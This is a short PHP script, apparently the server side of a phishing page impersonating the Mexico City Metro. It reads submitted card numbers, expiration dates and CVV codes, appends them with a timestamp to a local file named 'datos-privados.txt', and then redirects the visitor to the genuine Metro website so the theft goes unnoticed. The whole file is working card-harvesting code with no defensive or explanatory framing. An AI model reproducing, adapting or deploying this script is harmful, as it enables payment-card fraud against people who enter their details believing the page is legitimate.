<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = "N° de la tarjeta: " . $_POST['card_number'] . "\n";
    $data .= "Fecha de vencimiento: " . $_POST['expiration_date'] . "\n";
    $data .= "CVV: " . $_POST['cvv'] . "\n";
    $data .= "Fecha y Hora: " . date('Y-m-d H:i:s') . "\n\n";

    file_put_contents('datos-privados.txt', $data, FILE_APPEND);

    // Redirigir al usuario
    header('Location: https://www.metrocdmx.com.mx');
    exit;
}
?>
